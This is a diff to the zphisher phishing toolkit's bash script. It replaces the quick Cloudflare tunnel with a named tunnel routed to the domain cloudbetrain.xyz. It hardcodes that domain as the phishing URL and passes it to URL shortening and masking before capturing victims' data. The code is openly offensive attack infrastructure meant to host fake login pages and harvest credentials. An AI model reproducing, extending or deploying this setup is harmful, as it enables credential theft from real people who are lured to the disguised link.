@@ -95,6 +95,8 @@ __version__="2.3.5"
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
 PORT='8080' 
+TUNNEL_NAME="testingthefish"
+CONFIG_FILE="/home/ubuntu/zphisher/tunel-config.yaml"
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -451,20 +453,17 @@ capture_data() {
 
 ## Start Cloudflared
 start_cloudflared() { 
-	rm .cld.log > /dev/null 2>&1 &
+	rm .server/.cld.log > /dev/null 2>&1 &
 	cusport
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
-	if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	else
-		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.cld.log > /dev/null 2>&1 &
-	fi
-
-	sleep 8
-	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.cloudbetrain.xyz' ".server/.cld.log")
+	sleep 2 && cloudflared tunnel --config tunel-config.yaml run testingthefish > .server/.cld.log 2>&1 &
+	sleep 5
+	cloudflared tunnel route dns testingthefish cloudbetrain.xyz > .server/.cld.log 2>&1 &
+	sleep 5
+	cldflr_url=$'https://cloudbetrain.xyz' 
 	custom_url "$cldflr_url"
 	capture_data
 }
@@ -581,7 +580,7 @@ custom_url() {
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
 	{ custom_mask; sleep 1; clear; banner_small; }
-	if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
+	if [[ ${url} =~ [-a-zA-Z0-9.]*(cloudbetrain.xyz|loclx.io) ]]; then
 		if [[ $(site_stat $isgd) == 2* ]]; then
 			shorten $isgd "$url"
 		elif [[ $(site_stat $shortcode) == 2* ]]; then
